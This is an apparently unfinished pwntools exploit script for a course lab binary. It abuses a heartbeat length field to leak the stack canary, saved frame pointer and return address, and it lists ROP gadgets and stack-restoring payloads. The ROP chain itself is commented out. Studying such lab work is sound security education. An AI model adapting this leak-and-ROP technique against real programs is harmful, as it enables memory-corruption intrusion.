#!/usr/bin/python3
# 2022.09.27.1803.EST
from mmap import mmap
from pwn import *

"""
checksec:
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
"""

"""
Fastcall Argument Quick Reference
RDI, RSI, RDX, RCX, R8, R9
"""

"""
Register Quick Reference
rax, rbx, rcx, rdx, rsp, rbp, rsi, rdi, rip,
r8, r9, r10, r11, r12, r13, r14, r15
"""

gadgets = {
    "pop rax": p64(0x451fd7),    # pop rax;ret;
    "pop rbx": p64(0x4020cb),    # pop rbx;ret;
    #"pop rcx": p64(0x),    # [NOTE] pop rcx = 0x59 and ret = 0xc4
    "pop rdx": p64(0x4017ef),    # pop rdx;ret;
    #"pop rsp": p64(0x),
    "pop rbp": p64(0x401d41),    # pop rbp;ret;
    "pop rsi": p64(0x40f30e),    # pop rsi;ret;
    "pop rdi": p64(0x4018e2),    # pop rdi;ret;
    #"pop rip": p64(0x),
    #"pop r8" : p64(0x),
    #"pop r9" : p64(0x),
    #"pop r10": p64(0x),
    #"pop r11": p64(0x),
    "pop r12": p64(0x4031df),    # pop r12;ret;
    "pop r13": p64(0x419d88),    # pop r13;ret;
    "pop r14": p64(0x40f30d),    # pop r14;ret;
    "pop r15": p64(0x4018e1),    # popr15;ret;

    "xor rax": p64(0x44c190),    # xor rax, rax; ret;

    "ret": p64(0x44c384),    # ret;
}

# 0x443fef: xchg ecx, eax; sub eax, edx; ret;
gadgets["pop ecx"] = p64(0x443fef)

with gdb.debug("./lab4-3.bin") as p:
#with remote("csc748.hostbin.org", 7043) as p:
    overflow = b"2048:" + b"A"*1024    # Write until end of data[1024] but request 2048 bytes from the heartbeat protocol

    # First thing we need to do is leak critical stack information such as the canary, rbp, and the return address

    payload_leak = b""
    payload_leak += overflow
    payload_leak += b"\n"

    p.send(payload_leak)    # Silence heartbeat

    recv = p.recvuntil("Waiting for heart beat request...\n")
    p.read(31)    # printf("Sending heart beat response...\n") is exactly 31 bytes in length
    p.read(1024)    # Length of data[1024]. No need to read all those 'A's
    p.read(8) # Stack alignment padding of p64(0x00)
    canary = p.read(8)
    rbp = p.read(8)
    return_addr = p.read(8)

    print("Canary: {}".format(hex(u64(canary))))
    print("RBP: {}".format(hex(u64(rbp))))
    print("Return Address: {}".format(hex(u64(return_addr))))

    p.recv()    # Silence heartbeat

    # Now we can construct a payload that will actually attack the vulnerability with how the heartbeat protocol is processed

    """
    payload = b""
    #payload += gadgets["pop ecx"] + p64(0xdeadbeef)    # [TESTING]
    payload += gadgets["pop rax"] + p64(0xdeadbeef)
    payload += b"\n"

    p.send(payload)
    p.recv()    # Silence the rest of the returned heartbeat
    """

    # Here we restore the stack to what it was at the start

    payload_restore_stack = b""
    payload_restore_stack += p64(0x00)    # Alignment padding
    payload_restore_stack += canary
    payload_restore_stack += rbp
    payload_restore_stack += return_addr
    payload_restore_stack += b"\n"

    p.send(payload_restore_stack)
    p.recv()    # Silence heartbeat

    # Now we break out of the loop and go to a ret call

    payload_break_loop = b""
    payload_break_loop += b"0:AAAAAAAA"
    payload_break_loop += b"\n"

    p.send(payload_break_loop)
    #p.recv()    # Silence heartbeat

    p.interactive
